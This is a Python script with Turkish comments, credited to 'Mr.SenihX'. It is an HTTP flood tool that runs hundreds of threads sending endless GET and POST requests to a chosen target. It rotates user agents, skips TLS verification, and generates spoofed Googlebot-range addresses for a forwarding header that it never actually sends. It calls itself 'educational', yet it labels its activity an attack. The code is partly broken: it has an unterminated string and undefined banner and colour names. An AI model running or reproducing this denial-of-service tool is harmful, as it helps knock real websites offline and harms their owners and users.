import socket
import threading
import random
import argparse
import time
import ssl
import sys

print(f"\033[92m🚀 Mr.SenihX tarafından Tasarlandı\033[0m") 

"""

# Kullanıcı Arayüzü Geliştirildi ✅
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
]
methods = ["GET", "POST"]

def generate_random_ip():
    return f"66.249.{random.randint(0, 255)}.{random.randint(0, 255)}"

def flood_attack(target, port, method, user_agent):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)  # Maksimum 5 saniye sonra bağlantıyı kes

        # HTTPS bağlantıları için SSL sarmalama
        if port == 443:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            sock = context.wrap_socket(sock, server_hostname=target)

        sock.connect((target, port))

        x_forwarded_for = generate_random_ip()
        url_path = f"/?s={random.randint(1, 100000)}"

        headers = [
            f"{method} {url_path} HTTP/1.1",
            f"Host: {target}",
            f"User-Agent: {user_agent}",
            "Accept: text/html",
            "Accept-Language: en-US,en;q=0.5",
            "Cache-Control: no-cache",
            "Connection: Keep-Alive"
        ]

        # Eğer POST ise Content-Length ekle
        body = "param1=value1&param2=value2"
        if method == "POST":
            headers.append(f"Content-Length: {len(body)}")

        request = "\r\n".join(headers) + "\r\n\r\n"
        if method == "POST":
            request += body

        sock.sendall(request.encode())

        response = sock.recv(4096)
        if response:
            status_line = response.split(b'\r\n')[0].decode()
            status_code = status_line.split()[1] if len(status_line.split()) > 1 else "Unknown"
            print(f"{GREEN}[✔] {method} isteği gönderildi -> {target}:{port} (Yanıt Kodu: {status_code}){RESET}")

    except socket.timeout:
        print(f"{YELLOW}[!] {method} isteği zaman aşımına uğradı -> {target}:{port}{RESET}")
    except Exception as e:
        print(f"{RED}[X] {method} isteği başarısız -> {target}:{port} | Hata: {str(e)}{RESET}")
    finally:
        if 'sock' in locals():
            sock.close()

def attack_worker(target, port):
    while True:
        method = random.choice(methods)
        user_agent = random.choice(user_agents)
        flood_attack(target, port, method, user_agent)

def main():
    print(BANNER)

    parser = argparse.ArgumentParser(description="Mr.SenihX tarafından kodlanan eğitim amaçlı ağ simülatörü")
    parser.add_argument("-t", "--target", required=True, help="Hedef domain veya IP adresi")
    parser.add_argument("-p", "--port", type=int, default=80, help="Port numarası (varsayılan: 80)")
    parser.add_argument("-r", "--threads", type=int, default=500, help="Kullanılacak thread sayısı (varsayılan: 500)")
    args = parser.parse_args()

    # Kullanıcı Dostu Kontroller
    if args.threads > 1000:
        print(f"{YELLOW}[⚠] Uyarı: Çok fazla thread kullanıyorsunuz! (Önerilen: 100-500 arası){RESET}")

    full_url = f"https://{args.target}" if args.port == 443 else f"http://{args.target}"
    print(f"{BLUE}[+] Hedef: {full_url} (Port: {args.port}){RESET}")
    print(f"{GREEN}[+] {args.threads} thread başlatılıyor...{RESET}\n")

    for _ in range(args.threads):
        threading.Thread(target=attack_worker, args=(args.target, args.port), daemon=True).start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n{RED}[!] Saldırı durduruldu!{RESET}")

if __name__ == "__main__":
    main()
